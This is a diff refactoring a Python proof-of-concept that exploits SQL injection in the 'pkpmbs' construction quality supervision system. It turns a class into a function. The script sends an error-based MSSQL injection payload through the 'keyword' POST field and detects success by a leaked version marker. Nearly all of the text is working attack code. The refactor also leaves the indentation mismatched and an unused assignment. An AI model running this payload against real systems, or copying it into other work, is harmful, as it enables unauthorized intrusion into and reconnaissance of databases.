@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-  
-  
-
-class addresslist_keyword_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['pkpmbs建设工程质量监督系统注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
@@ -27,7 +20,7 @@ class addresslist_keyword_sqli:
             "keyword":"1'AnD 1=CoNvErt(InT,(ChAr(71)+ChAr(65)+ChAr(79)+ChAr(74)+ChAr(73)+@@VeRsIon)) AnD'%'='",
             "Submit3":"%E6%90%9C%E3%80%80%E7%B4%A2"
         }
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if r"GAOJIMicrosoft" in req.text:
@@ -42,5 +35,5 @@ class addresslist_keyword_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = addresslist_keyword_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
